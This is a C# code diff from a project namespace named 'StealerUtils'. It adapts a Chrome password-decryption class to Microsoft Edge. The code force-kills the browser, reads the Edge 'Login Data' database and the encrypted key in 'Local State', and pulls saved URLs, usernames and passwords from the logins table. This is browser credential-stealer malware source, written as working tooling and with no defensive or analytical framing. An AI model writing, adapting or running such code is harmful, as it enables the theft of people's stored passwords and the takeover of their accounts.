@@ -15,20 +15,21 @@ using System.Threading.Tasks;
 
 namespace Client_side.StealerUtils
 {
-    internal class Credential
-    {
-        public string url { get; set; }
-        public string username { get; set; }
-        public string password { get; set; }
-    }
-    public class ChromeDecrypt
+    //internal class Credential
+    //{
+    //    public string url { get; set; }
+    //    public string username { get; set; }
+    //    public string password { get; set; }
+    //}
+    public class EdgeDecrypt
     {
         public static List<String> MainFunction()
         {
-            Process[] processlist = Process.GetProcessesByName("chrome");
+            Process[] processlist = Process.GetProcessesByName("edge");
             if (processlist.Length != 0)
             {
-                //return new List<string> { Encryptor.ConvertStr("Chrome is running! Decrypt failed!") };
+                //return new List<string> { Encryptor.ConvertStr("Brave is running! Decrypt failed!") };
+                // Kill the process
                 foreach (Process process in processlist)
                 {
                     process.Kill();
@@ -36,7 +37,7 @@ namespace Client_side.StealerUtils
             }
 
             string localappdata = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
-            string LoginDataPath = localappdata + "\\Google\\Chrome\\User Data\\Default\\Login Data";
+            string LoginDataPath = localappdata + @"\Microsoft\Edge\User Data\Default\Login Data";
 
             byte[] key = GetKey();
 
@@ -45,7 +46,6 @@ namespace Client_side.StealerUtils
 
             SqliteConnection conn = new SqliteConnection(connectionString);
             conn.Open();
-
             List<Credential> creds = new List<Credential>();
 
             SqliteCommand cmd = new SqliteCommand("select * from logins", conn);
@@ -120,7 +120,7 @@ namespace Client_side.StealerUtils
         static byte[] GetKey()
         {
             string localappdata = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
-            string FilePath = localappdata + "\\Google\\Chrome\\User Data\\Local State";
+            string FilePath = localappdata + @"\Microsoft\Edge\User Data\Local State";
             string content = File.ReadAllText(FilePath);
             dynamic json = JsonConvert.DeserializeObject(content);
             string key = json.os_crypt.encrypted_key;
